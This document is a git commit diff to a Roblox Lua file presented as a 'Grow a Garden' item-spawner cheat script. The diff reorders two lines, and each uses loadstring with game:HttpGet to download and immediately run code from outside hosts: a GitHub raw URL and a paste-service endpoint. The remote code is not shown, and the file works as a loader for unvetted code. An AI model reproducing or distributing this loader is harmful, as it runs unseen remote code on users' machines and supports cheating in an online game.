03ca650b58e0852391a68a49c5fc43db528b3e0d
Roblox Scripts <gregyheport@gmail.com>
2025-07-23 18:18:14 +0800

    Update X-Hub-Spawner-Script-GrowAGarden-Working.lua

--- X-Hub-Spawner-Script-GrowAGarden-Working.lua
+++ X-Hub-Spawner-Script-GrowAGarden-Working.lua
@@ -1,3 +1,3 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Rawbr10/loader/refs/heads/main/GrowAGarden-X-Hub-Spawner.lua"))()
-task.wait(1.5)
 loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/NtweI5JMMdfkwiwi/raw", true))()
+task.wait(1.5)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Rawbr10/loader/refs/heads/main/GrowAGarden-X-Hub-Spawner.lua"))()
